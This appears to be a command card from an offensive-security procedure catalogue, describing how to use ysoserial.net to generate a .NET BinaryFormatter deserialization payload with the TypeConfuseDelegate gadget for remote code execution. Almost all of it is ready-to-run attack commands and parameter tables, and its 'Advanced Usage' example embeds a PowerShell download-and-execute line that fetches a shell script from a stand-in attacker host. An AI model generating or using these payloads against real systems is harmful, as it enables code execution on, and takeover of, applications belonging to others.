---
id: c1b2c3d4-e5f6-7890-abcd-ef1234567895
name: ysoserial-generate-rce-payload
type: command
executor: powershell
data: >-
  ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc.exe" --out
  payload.bin
output: null
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:23:54.095Z'
platforms:
  - Windows
tags:
  - rce
  - deserialization
verified: false
validated: true
submitted: true
---

# ysoserial-generate-rce-payload

## Command

```powershell
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc.exe" --out payload.bin
```

## Description

Generates a malicious serialized payload using ysoserial.net for .NET BinaryFormatter deserialization exploits, triggering RCE by executing a specified command like calc.exe upon deserialization.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-f BinaryFormatter` | Specifies the formatter type | Yes |
| `-g TypeConfuseDelegate` | Gadget chain for RCE | Yes |
| `-c "calc.exe"` | Command to execute | Yes |
| `--out payload.bin` | Output file for the payload | Yes |

## Examples

### Basic Usage

```powershell
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc.exe" --out payload.bin
```

### Advanced Usage

```powershell
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')" --out shell.bin
```

## Expected Output

A binary file (payload.bin) containing the serialized object. No console output unless errors occur; verify by testing in a safe deserialization environment.

## Related

- [[Related Procedure: Generate-Malicious-Serialized-Payload-Using-ysoserial.net]]
